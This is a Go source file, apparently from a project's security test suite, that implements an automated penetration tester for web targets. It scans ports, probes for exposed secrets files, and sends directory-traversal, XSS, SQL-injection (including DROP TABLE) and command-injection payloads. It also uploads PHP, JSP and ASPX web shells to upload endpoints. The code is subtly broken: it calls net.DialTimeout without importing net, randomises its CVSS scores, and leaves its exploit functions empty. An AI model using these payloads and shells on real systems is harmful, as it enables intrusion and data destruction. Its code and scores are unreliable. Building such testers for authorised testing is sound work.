package pentest

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"fleetd.sh/test/security"
)

// PenetrationTester provides automated penetration testing capabilities
type PenetrationTester struct {
	client     *http.Client
	fuzzer     *Fuzzer
	scanner    *PortScanner
	exploiter  *Exploiter
	concurrent int
}

// NewPenetrationTester creates a new penetration tester
func NewPenetrationTester() *PenetrationTester {
	return &PenetrationTester{
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:       100,
				IdleConnTimeout:    90 * time.Second,
				DisableCompression: false,
			},
		},
		fuzzer:     NewFuzzer(),
		scanner:    NewPortScanner(),
		exploiter:  NewExploiter(),
		concurrent: 10,
	}
}

// RunPenetrationTests executes comprehensive penetration tests
func (p *PenetrationTester) RunPenetrationTests(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Parse target URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}

	// Phase 1: Information Gathering
	infoVulns, err := p.informationGathering(ctx, targetURL)
	if err != nil {
		return vulnerabilities, fmt.Errorf("information gathering failed: %w", err)
	}
	vulnerabilities = append(vulnerabilities, infoVulns...)

	// Phase 2: Port Scanning
	portVulns, err := p.portScanning(ctx, parsedURL.Hostname())
	if err != nil {
		return vulnerabilities, fmt.Errorf("port scanning failed: %w", err)
	}
	vulnerabilities = append(vulnerabilities, portVulns...)

	// Phase 3: Web Application Testing
	webVulns, err := p.webApplicationTesting(ctx, targetURL)
	if err != nil {
		return vulnerabilities, fmt.Errorf("web application testing failed: %w", err)
	}
	vulnerabilities = append(vulnerabilities, webVulns...)

	// Phase 4: API Testing
	apiVulns, err := p.apiTesting(ctx, targetURL)
	if err != nil {
		return vulnerabilities, fmt.Errorf("API testing failed: %w", err)
	}
	vulnerabilities = append(vulnerabilities, apiVulns...)

	// Phase 5: Exploitation Attempts
	exploitVulns, err := p.exploitationTesting(ctx, targetURL)
	if err != nil {
		return vulnerabilities, fmt.Errorf("exploitation testing failed: %w", err)
	}
	vulnerabilities = append(vulnerabilities, exploitVulns...)

	return vulnerabilities, nil
}

// informationGathering performs reconnaissance and information gathering
func (p *PenetrationTester) informationGathering(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Test for information disclosure
	infoTests := []struct {
		path     string
		patterns []string
		severity string
	}{
		{
			path:     "/.env",
			patterns: []string{"DB_PASSWORD", "API_KEY", "SECRET"},
			severity: "Critical",
		},
		{
			path:     "/config.json",
			patterns: []string{"password", "secret", "key"},
			severity: "High",
		},
		{
			path:     "/robots.txt",
			patterns: []string{"Disallow:", "admin", "private"},
			severity: "Low",
		},
		{
			path:     "/.git/config",
			patterns: []string{"[core]", "repository"},
			severity: "Medium",
		},
		{
			path:     "/package.json",
			patterns: []string{"dependencies", "version"},
			severity: "Low",
		},
		{
			path:     "/swagger.json",
			patterns: []string{"swagger", "paths", "definitions"},
			severity: "Medium",
		},
		{
			path:     "/api/v1/health",
			patterns: []string{"version", "build", "commit"},
			severity: "Low",
		},
	}

	for _, test := range infoTests {
		select {
		case <-ctx.Done():
			return vulnerabilities, ctx.Err()
		default:
		}

		resp, err := p.client.Get(targetURL + test.path)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := string(body)
			for _, pattern := range test.patterns {
				if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(pattern)) {
					vuln := &security.Vulnerability{
						ID:          fmt.Sprintf("info-disclosure-%s", strings.ReplaceAll(test.path, "/", "-")),
						Title:       "Information Disclosure",
						Description: fmt.Sprintf("Sensitive information exposed at %s", test.path),
						Severity:    test.severity,
						CVSSScore:   p.calculateCVSSScore(test.severity),
						Category:    "information_disclosure",
						Confidence:  "High",
						Remediation: "Remove or restrict access to sensitive files and endpoints",
						Evidence:    fmt.Sprintf("Found pattern '%s' in response", pattern),
						Timestamp:   time.Now(),
						TestMethod:  "Information Gathering",
						AffectedURL: targetURL + test.path,
					}
					vulnerabilities = append(vulnerabilities, vuln)
					break
				}
			}
		} else {
			resp.Body.Close()
		}
	}

	return vulnerabilities, nil
}

// portScanning performs network port scanning
func (p *PenetrationTester) portScanning(ctx context.Context, hostname string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Common ports to scan
	ports := []int{
		21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995,
		1433, 3306, 5432, 6379, 27017, 3389, 5900, 8080, 8443,
	}

	results := p.scanner.ScanPorts(ctx, hostname, ports)

	for _, result := range results {
		if result.Open {
			severity := "Low"
			if p.isHighRiskPort(result.Port) {
				severity = "Medium"
			}

			vuln := &security.Vulnerability{
				ID:          fmt.Sprintf("open-port-%d", result.Port),
				Title:       "Open Network Port",
				Description: fmt.Sprintf("Port %d is open and accessible", result.Port),
				Severity:    severity,
				CVSSScore:   p.calculateCVSSScore(severity),
				Category:    "network_security",
				Confidence:  "High",
				Remediation: "Review port necessity and implement firewall rules",
				Evidence:    fmt.Sprintf("Port %d responded to connection attempt", result.Port),
				Timestamp:   time.Now(),
				TestMethod:  "Port Scanning",
				AffectedURL: fmt.Sprintf("%s:%d", hostname, result.Port),
			}
			vulnerabilities = append(vulnerabilities, vuln)
		}
	}

	return vulnerabilities, nil
}

// webApplicationTesting performs web application penetration testing
func (p *PenetrationTester) webApplicationTesting(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Directory traversal tests
	traversalVulns, err := p.testDirectoryTraversal(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, traversalVulns...)
	}

	// XSS tests
	xssVulns, err := p.testXSS(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, xssVulns...)
	}

	// CSRF tests
	csrfVulns, err := p.testCSRF(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, csrfVulns...)
	}

	// File upload tests
	uploadVulns, err := p.testFileUpload(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, uploadVulns...)
	}

	return vulnerabilities, nil
}

// apiTesting performs API-specific penetration testing
func (p *PenetrationTester) apiTesting(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// API enumeration
	endpoints := []string{
		"/api/v1/users",
		"/api/v1/devices",
		"/api/v1/admin",
		"/api/v1/settings",
		"/api/v1/logs",
		"/api/v1/backup",
		"/api/v1/health",
		"/api/v1/metrics",
	}

	for _, endpoint := range endpoints {
		select {
		case <-ctx.Done():
			return vulnerabilities, ctx.Err()
		default:
		}

		vulns := p.testAPIEndpoint(ctx, targetURL+endpoint)
		vulnerabilities = append(vulnerabilities, vulns...)
	}

	return vulnerabilities, nil
}

// exploitationTesting attempts to exploit discovered vulnerabilities
func (p *PenetrationTester) exploitationTesting(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Attempt privilege escalation
	privescVulns, err := p.testPrivilegeEscalation(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, privescVulns...)
	}

	// Attempt authentication bypass
	authBypassVulns, err := p.testAuthenticationBypass(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, authBypassVulns...)
	}

	// Attempt remote code execution
	rceVulns, err := p.testRemoteCodeExecution(ctx, targetURL)
	if err == nil {
		vulnerabilities = append(vulnerabilities, rceVulns...)
	}

	return vulnerabilities, nil
}

// Helper testing functions

func (p *PenetrationTester) testDirectoryTraversal(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
	}

	endpoints := []string{
		"/api/v1/files?path=%s",
		"/download?file=%s",
		"/view?document=%s",
	}

	for _, endpoint := range endpoints {
		for _, payload := range payloads {
			select {
			case <-ctx.Done():
				return vulnerabilities, ctx.Err()
			default:
			}

			testURL := fmt.Sprintf(targetURL+endpoint, url.QueryEscape(payload))
			resp, err := p.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}

				// Check for file content indicators
				if strings.Contains(string(body), "root:x:") || strings.Contains(string(body), "127.0.0.1") {
					vuln := &security.Vulnerability{
						ID:          "directory-traversal-exploit",
						Title:       "Directory Traversal Exploit",
						Description: "Successfully exploited directory traversal vulnerability",
						Severity:    "Critical",
						CVSSScore:   9.1,
						Category:    "path_traversal",
						Confidence:  "High",
						Remediation: "Implement proper input validation and file access controls",
						Evidence:    "Successfully accessed system files",
						Timestamp:   time.Now(),
						TestMethod:  "Directory Traversal Exploit",
						AffectedURL: testURL,
						PayloadUsed: payload,
					}
					vulnerabilities = append(vulnerabilities, vuln)
				}
			} else {
				resp.Body.Close()
			}
		}
	}

	return vulnerabilities, nil
}

func (p *PenetrationTester) testXSS(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	xssPayloads := []string{
		`<script>alert('XSS')</script>`,
		`<img src=x onerror=alert('XSS')>`,
		`<svg onload=alert('XSS')>`,
		`javascript:alert('XSS')`,
		`<iframe src=javascript:alert('XSS')>`,
	}

	// Test GET parameters
	for _, payload := range xssPayloads {
		select {
		case <-ctx.Done():
			return vulnerabilities, ctx.Err()
		default:
		}

		testURL := fmt.Sprintf("%s/search?q=%s", targetURL, url.QueryEscape(payload))
		resp, err := p.client.Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			// Check if payload is reflected in response
			if strings.Contains(string(body), payload) {
				vuln := &security.Vulnerability{
					ID:          "xss-reflected",
					Title:       "Reflected Cross-Site Scripting",
					Description: "XSS payload reflected in response without proper encoding",
					Severity:    "High",
					CVSSScore:   7.2,
					Category:    "cross_site_scripting",
					Confidence:  "High",
					Remediation: "Implement proper output encoding and input validation",
					Evidence:    "XSS payload reflected in response",
					Timestamp:   time.Now(),
					TestMethod:  "XSS Testing",
					AffectedURL: testURL,
					PayloadUsed: payload,
				}
				vulnerabilities = append(vulnerabilities, vuln)
				break // Found one, move on
			}
		} else {
			resp.Body.Close()
		}
	}

	return vulnerabilities, nil
}

func (p *PenetrationTester) testCSRF(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Test state-changing operations without CSRF protection
	csrfTests := []struct {
		method string
		path   string
		body   string
	}{
		{"POST", "/api/v1/users", `{"username":"test","password":"test"}`},
		{"PUT", "/api/v1/settings", `{"key":"value"}`},
		{"DELETE", "/api/v1/devices/1", ""},
	}

	for _, test := range csrfTests {
		select {
		case <-ctx.Done():
			return vulnerabilities, ctx.Err()
		default:
		}

		var body io.Reader
		if test.body != "" {
			body = strings.NewReader(test.body)
		}

		req, err := http.NewRequest(test.method, targetURL+test.path, body)
		if err != nil {
			continue
		}

		// Don't include CSRF token or other protection headers
		req.Header.Set("Content-Type", "application/json")

		resp, err := p.client.Do(req)
		if err != nil {
			continue
		}

		// If request succeeds without CSRF protection, it's vulnerable
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			vuln := &security.Vulnerability{
				ID:          fmt.Sprintf("csrf-%s", strings.ToLower(test.method)),
				Title:       "Cross-Site Request Forgery",
				Description: fmt.Sprintf("CSRF vulnerability in %s %s", test.method, test.path),
				Severity:    "Medium",
				CVSSScore:   6.5,
				Category:    "csrf",
				Confidence:  "High",
				Remediation: "Implement CSRF protection tokens and SameSite cookies",
				Evidence:    "State-changing request succeeded without CSRF protection",
				Timestamp:   time.Now(),
				TestMethod:  "CSRF Testing",
				AffectedURL: targetURL + test.path,
			}
			vulnerabilities = append(vulnerabilities, vuln)
		}

		resp.Body.Close()
	}

	return vulnerabilities, nil
}

func (p *PenetrationTester) testFileUpload(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Test malicious file uploads
	maliciousFiles := []struct {
		filename string
		content  string
		type_    string
	}{
		{"shell.php", "<?php system($_GET['cmd']); ?>", "php_shell"},
		{"shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "jsp_shell"},
		{"shell.aspx", "<%@ Page Language=\"C#\" %>\n<% Response.Write(System.Diagnostics.Process.Start(Request[\"cmd\"])); %>", "aspx_shell"},
		{"../../../shell.php", "<?php system($_GET['cmd']); ?>", "path_traversal"},
		{"shell.php.txt", "<?php system($_GET['cmd']); ?>", "extension_bypass"},
	}

	uploadEndpoints := []string{
		"/api/v1/upload",
		"/upload",
		"/api/v1/import",
		"/api/v1/backup/restore",
	}

	for _, endpoint := range uploadEndpoints {
		for _, file := range maliciousFiles {
			select {
			case <-ctx.Done():
				return vulnerabilities, ctx.Err()
			default:
			}

			// Create multipart form data
			var body bytes.Buffer
			boundary := "----formdata" + fmt.Sprintf("%d", rand.Int())

			// Write file part
			body.WriteString(fmt.Sprintf("--%s\r\n", boundary))
			body.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n", file.filename))
			body.WriteString("Content-Type: application/octet-stream\r\n\r\n")
			body.WriteString(file.content)
			body.WriteString(fmt.Sprintf("\r\n--%s--\r\n", boundary))

			req, err := http.NewRequest("POST", targetURL+endpoint, &body)
			if err != nil {
				continue
			}

			req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

			resp, err := p.client.Do(req)
			if err != nil {
				continue
			}

			// If upload succeeds, check if file is executable
			if resp.StatusCode == 200 || resp.StatusCode == 201 {
				// Try to access uploaded file
				testResp, err := p.client.Get(targetURL + "/uploads/" + file.filename)
				if err == nil && testResp.StatusCode == 200 {
					vuln := &security.Vulnerability{
						ID:          fmt.Sprintf("file-upload-%s", file.type_),
						Title:       "Malicious File Upload",
						Description: "Successfully uploaded and accessed malicious file",
						Severity:    "Critical",
						CVSSScore:   9.8,
						Category:    "file_upload",
						Confidence:  "High",
						Remediation: "Implement file type validation, content scanning, and execute uploaded files in sandboxed environment",
						Evidence:    fmt.Sprintf("Uploaded file %s is accessible", file.filename),
						Timestamp:   time.Now(),
						TestMethod:  "File Upload Testing",
						AffectedURL: targetURL + endpoint,
						PayloadUsed: file.filename,
					}
					vulnerabilities = append(vulnerabilities, vuln)
					testResp.Body.Close()
				}
				if testResp != nil {
					testResp.Body.Close()
				}
			}

			resp.Body.Close()
		}
	}

	return vulnerabilities, nil
}

func (p *PenetrationTester) testAPIEndpoint(ctx context.Context, endpoint string) []*security.Vulnerability {
	vulnerabilities := make([]*security.Vulnerability, 0)

	// Test different HTTP methods
	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}

	for _, method := range methods {
		select {
		case <-ctx.Done():
			return vulnerabilities
		default:
		}

		req, err := http.NewRequest(method, endpoint, nil)
		if err != nil {
			continue
		}

		resp, err := p.client.Do(req)
		if err != nil {
			continue
		}

		// Check for method-specific vulnerabilities
		if method == "OPTIONS" && resp.StatusCode == 200 {
			allowHeader := resp.Header.Get("Allow")
			if strings.Contains(allowHeader, "DELETE") || strings.Contains(allowHeader, "PUT") {
				vuln := &security.Vulnerability{
					ID:          "dangerous-methods-allowed",
					Title:       "Dangerous HTTP Methods Allowed",
					Description: "API endpoint allows potentially dangerous HTTP methods",
					Severity:    "Medium",
					CVSSScore:   5.3,
					Category:    "api_security",
					Confidence:  "High",
					Remediation: "Restrict HTTP methods to only those required",
					Evidence:    fmt.Sprintf("Allow header: %s", allowHeader),
					Timestamp:   time.Now(),
					TestMethod:  "HTTP Method Testing",
					AffectedURL: endpoint,
				}
				vulnerabilities = append(vulnerabilities, vuln)
			}
		}

		resp.Body.Close()
	}

	return vulnerabilities
}

// Placeholder implementations for exploit testing
func (p *PenetrationTester) testPrivilegeEscalation(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	// This would implement privilege escalation testing
	return []*security.Vulnerability{}, nil
}

func (p *PenetrationTester) testAuthenticationBypass(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	// This would implement authentication bypass testing
	return []*security.Vulnerability{}, nil
}

func (p *PenetrationTester) testRemoteCodeExecution(ctx context.Context, targetURL string) ([]*security.Vulnerability, error) {
	// This would implement RCE testing
	return []*security.Vulnerability{}, nil
}

// Helper functions

func (p *PenetrationTester) calculateCVSSScore(severity string) float64 {
	switch severity {
	case "Critical":
		return 9.0 + rand.Float64()
	case "High":
		return 7.0 + rand.Float64()*2
	case "Medium":
		return 4.0 + rand.Float64()*3
	case "Low":
		return 1.0 + rand.Float64()*3
	default:
		return 0.1
	}
}

func (p *PenetrationTester) isHighRiskPort(port int) bool {
	highRiskPorts := []int{21, 22, 23, 1433, 3306, 5432, 3389, 5900}
	for _, riskPort := range highRiskPorts {
		if port == riskPort {
			return true
		}
	}
	return false
}

// Supporting structures and types for penetration testing components

type Fuzzer struct {
	payloads map[string][]string
}

func NewFuzzer() *Fuzzer {
	return &Fuzzer{
		payloads: map[string][]string{
			"sql": {
				"' OR '1'='1",
				"'; DROP TABLE users; --",
				"' UNION SELECT * FROM users --",
			},
			"xss": {
				"<script>alert('XSS')</script>",
				"<img src=x onerror=alert('XSS')>",
				"javascript:alert('XSS')",
			},
			"command": {
				"; ls -la",
				"| cat /etc/passwd",
				"&& whoami",
			},
		},
	}
}

type PortScanner struct {
	timeout time.Duration
}

func NewPortScanner() *PortScanner {
	return &PortScanner{
		timeout: 3 * time.Second,
	}
}

type PortScanResult struct {
	Port int
	Open bool
}

func (ps *PortScanner) ScanPorts(ctx context.Context, hostname string, ports []int) []PortScanResult {
	results := make([]PortScanResult, 0, len(ports))
	resultChan := make(chan PortScanResult, len(ports))

	var wg sync.WaitGroup

	// Limit concurrent scans
	semaphore := make(chan struct{}, 50)

	for _, port := range ports {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			select {
			case <-ctx.Done():
				return
			default:
			}

			// Simple TCP connection test
			address := fmt.Sprintf("%s:%d", hostname, p)
			conn, err := net.DialTimeout("tcp", address, ps.timeout)

			result := PortScanResult{
				Port: p,
				Open: err == nil,
			}

			if conn != nil {
				conn.Close()
			}

			resultChan <- result
		}(port)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for result := range resultChan {
		results = append(results, result)
	}

	return results
}

type Exploiter struct {
	knownExploits map[string]func(string) bool
}

func NewExploiter() *Exploiter {
	return &Exploiter{
		knownExploits: make(map[string]func(string) bool),
	}
}